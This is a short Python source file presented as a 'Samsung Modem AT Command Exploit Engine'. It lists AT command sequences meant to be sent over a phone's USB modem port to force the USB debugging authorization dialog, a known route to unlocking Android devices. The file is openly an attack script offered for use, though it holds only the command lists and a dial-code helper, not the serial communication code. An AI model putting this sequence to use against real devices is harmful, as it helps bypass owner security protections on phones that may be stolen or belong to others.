"""
Android Multi-Tool Pro - Samsung Modem AT Command Exploit Engine
Communicates over virtual COM ports to trigger the USB Debugging authorization
dialog directly from the Samsung *#0*# Emergency Test menu.
"""

from typing import List, Tuple, Optional

class SamsungModemEngine:
    """
    Handles serial AT commands sent to Samsung Mobile USB Modem COM port.
    """
    MODEM_INIT_COMMANDS = [
        "AT\r\n",
        "ATE0\r\n",
        "AT+DEVCONINFO\r\n"
    ]

    # The famous test mode exploit command sequence
    TEST_MODE_ENABLE_ADB = [
        "AT+KNTD=00000000\r\n",
        "AT+SWAT=1\r\n",
        "AT+ACTIVATE=0,0,0\r\n"
    ]

    def build_test_mode_sequence(self) -> List[Tuple[str, str]]:
        """Returns sequence of commands with descriptions."""
        return [
            ("AT", "Ping Modem Interface"),
            ("AT+DEVCONINFO", "Read device hardware and firmware version"),
            ("AT+KNTD=00000000", "Inject Test Mode Debugger Switch"),
            ("AT+SWAT=1", "Enable System Watchdog & ADB listener"),
            ("AT+ACTIVATE=0,0,0", "Force display of 'Allow USB Debugging' dialog")
        ]

    def format_dial_command(self, dial_code: str) -> str:
        """Sends AT command simulating keypresses on the dialer keypad."""
        clean = dial_code.replace("#", "%23")
        return f"ATD{clean};\r\n"
